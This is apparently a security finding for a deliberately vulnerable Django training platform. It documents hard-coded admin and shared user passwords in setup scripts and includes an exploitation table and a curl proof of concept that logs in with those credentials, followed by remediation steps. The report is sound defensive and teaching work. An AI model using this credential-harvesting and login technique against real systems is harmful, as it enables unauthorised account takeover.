# Description

Hard-coded credentials (CWE-798: Use of Hard-coded Credentials, closely related to CWE-1391: Use of Weak Credentials) are embedded in the platform's setup scripts. The `admin` superuser password `X#9kLm$P2v@nQ8w!ZjRe` is never rotated and is the same value used for the Django admin site (`/admin/`), the main login (`/account/login/`), and the webmail account. All seeded test users share the single default password `Tr@c3d!7BxN#m9Kw2YpL`.

Vulnerable locations (deployed source under `WOCShAck#5/wocshack/djangoWocshack_5/`):

- `setup/setup_database.py:41`: `password = 'X#9kLm$P2v@nQ8w!ZjRe'` (admin superuser created with this literal).
- `setup/setup_database.py:224`: `password=user_data.get('password', 'Tr@c3d!7BxN#m9Kw2YpL')` (default password for seeded users).
- `setup/setup_database.py:516`: `print("  Admin:    admin / X#9kLm$P2v@nQ8w!ZjRe")` (credentials printed to the console at setup).
- `setup/setup_database.py:519-545`: every seeded test user printed with the shared password `Tr@c3d!7BxN#m9Kw2YpL`.
- `setup/setup_webmail.py:25`: `{'username': 'admin', 'password': 'X#9kLm$P2v@nQ8w!ZjRe'}` (hard-coded admin entry in the webmail provisioning list).
- `setup/setup_webmail.py:38`: fallback `row.get('password', 'Tr@c3d!7BxN#m9Kw2YpL')` for every user.
- `setup/setup_webmail.py:90-105`: `send_welcome_email()` mails the cleartext password to each account's mailbox, so the credentials are also stored in the webmail database.
- `setup/users.csv:2-15`: the `password` column holds the cleartext shared password for every seeded user.
- `Dockerfile:29`: the container runs `setup/setup_webmail.py` at start, and `COPY . .` (line 21) bakes the `setup/` directory and its credentials into the image.

The credentials are not in `shared/templates/base/base.html`; that template contains no credential material. The dev catalog hint pointing at `base.html` is inaccurate, and the actual sources are the setup scripts above.

No authentication-bypass logic is needed. The vulnerability is that a valid privileged credential is recoverable from the codebase, the container image, the console output, and (via the webmail leak) the mailboxes, and it is reused across services and never rotated.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Obtain the source or container image (repository checkout, or `docker run`/`docker exec` on the image) and open `setup/setup_database.py` and `setup/setup_webmail.py`. | Admin password `X#9kLm$P2v@nQ8w!ZjRe` and shared user password `Tr@c3d!7BxN#m9Kw2YpL` are read in plaintext (`setup_database.py:41`, `setup_webmail.py:25`). |
| 2 | Alternatively, read the setup console output (`setup_database.py:514-545`) from logs. | Same credentials, plus the admin API key, appear in the summary. |
| 3 | Log in to the Django admin at `http://localhost:8000/admin/` as `admin` with `X#9kLm$P2v@nQ8w!ZjRe`. | Full Django admin access (all models, all users). |
| 4 | Log in to `http://localhost:8000/account/login/` as `admin` with the same password. | Authenticated session with admin privileges on the main platform. |
| 5 | Log in as any seeded user (e.g. `johndoe`) with `Tr@c3d!7BxN#m9Kw2YpL`. | Access to 14 accounts from one leaked password. |
| 6 | Reuse the admin password on the webmail (`http://localhost:8088`). | Access to the admin mailbox. |

# PoC

Harvest the credentials from source, then log in (the main login is documented in the dev catalog as `POST /account/login/`; field names `username` / `password` are assumed):

```bash
# 1. Harvest credentials from the deployed source (no network access needed)
grep -rn "X#9kLm" wocshack/djangoWocshack_5/setup/
grep -rn "Tr@c3d" wocshack/djangoWocshack_5/setup/users.csv | head -3

# 2. Obtain CSRF token
curl -s -c admin.cookies http://localhost:8000/account/login/ -o /dev/null
CSRF=$(grep csrftoken admin.cookies | awk '{print $NF}')

# 3. Log in as admin with the hard-coded password
curl -s -b admin.cookies -c admin.cookies -X POST \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "username=admin" \
  --data-urlencode 'password=X#9kLm$P2v@nQ8w!ZjRe' \
  -H "Referer: http://localhost:8000/account/login/" \
  http://localhost:8000/account/login/
# Expected: HTTP 302 to the dashboard

# 4. Confirm admin panel access with the same session
curl -s -b admin.cookies -o /dev/null -w "%{http_code}\n" http://localhost:8000/admin/
# Expected: 200 (admin site), not 302 to the admin login

# 5. Log in as a seeded user with the shared default password
curl -s -c user.cookies http://localhost:8000/account/login/ -o /dev/null
CSRF=$(grep csrftoken user.cookies | awk '{print $NF}')
curl -s -b user.cookies -c user.cookies -X POST \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "username=johndoe" \
  --data-urlencode 'password=Tr@c3d!7BxN#m9Kw2YpL' \
  -H "Referer: http://localhost:8000/account/login/" \
  http://localhost:8000/account/login/
# Expected: HTTP 302 (authenticated session)
```

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Anyone with the source, image, or setup logs can read the admin and shared user passwords; the admin account exposes all user records, profiles, and bank data through the admin panel. |
| Integrity | Full administrative control of the platform: modify or delete any user or content, change configuration, and create stored-XSS articles (see M3). |
| Availability | Admin access allows deleting users, accounts, or content, and disabling the service. |

Overall severity: **Critical**. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8). The credentials are static and public to anyone who can read the repository or image, need no interaction, and grant full admin rights across three services. The password is reused for the admin site, main login, and webmail, which multiplies the blast radius.

# Remediation

1. Remove all literal credentials from `setup/setup_database.py`, `setup/setup_webmail.py`, and `setup/users.csv`. Generate random passwords at setup time (e.g. `secrets.token_urlsafe(24)`) or require them as environment variables or from a secrets manager.
2. Rotate the `admin` password and every seeded user password immediately, and invalidate existing sessions and API keys printed in the setup output.
3. Stop printing credentials and API keys in the setup summary (`setup_database.py:514-545`) and stop emailing cleartext passwords (`setup_webmail.py:90-105`); send a one-time password-reset link instead.
4. Exclude `setup/` and any secret-bearing files from the container image (`.dockerignore`, and avoid `COPY . .` of secrets in `Dockerfile:21`), and never reuse one password across services.
5. Enforce a strong password policy, unique credentials per service, account lockout after repeated failures, and MFA on the admin account.

# Author
WOCSA
